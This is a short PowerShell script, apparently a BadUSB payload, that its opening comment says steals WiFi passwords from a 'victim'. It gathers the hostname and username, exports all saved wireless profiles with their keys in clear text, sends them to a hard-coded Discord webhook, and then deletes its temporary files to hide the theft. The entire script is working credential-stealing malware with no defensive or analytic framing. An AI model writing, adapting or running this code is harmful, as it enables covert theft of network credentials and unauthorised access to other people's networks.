# This code gets the WiFi passwords from a victim (with some basic info such as Hostname and Username), and sends them to a Discord Webhook

$Uri='https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1'
$Body = ''
Set-Location -Path $env:TEMP
$hostname = hostname
$hostname = "Hostname: " + $hostname
$hostname > Wi-Fi-PASS
$whoami = whoami
$whoami = "User: " + $whoami
$whoami >> Wi-Fi-PASS
netsh wlan export profile key=clear
Select-String -Path Wi*.xml -Pattern 'keyMaterial' >> Wi-Fi-PASS
foreach($line in Get-Content .\Wi-Fi-PASS)
{
    if ($line -match '(.+)\.xml:\d+:\s*<keyMaterial>(.*?)</keyMaterial>'){
        $Body = $Body + $matches[1] + ':' + $matches[2] + "`n"
    }
    else {
        $Body = $Body + $line + "`n"
    }
}
$WebhookURL = "https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1"
$Payload = @{
    "content" = $Body
    "username" = "Attiny85"
    "avatar_url" = "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcRreSGlDg-_3EkrNaC74ef-ARv9clgr7qpwV728WqnfQvVjfHbB"
}
$Body = $Payload | ConvertTo-Json
Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "application/json" -Body $Body
Remove-Item -Path 'Wi-*' -Recurse -Force -ErrorAction SilentlyContinue
exit
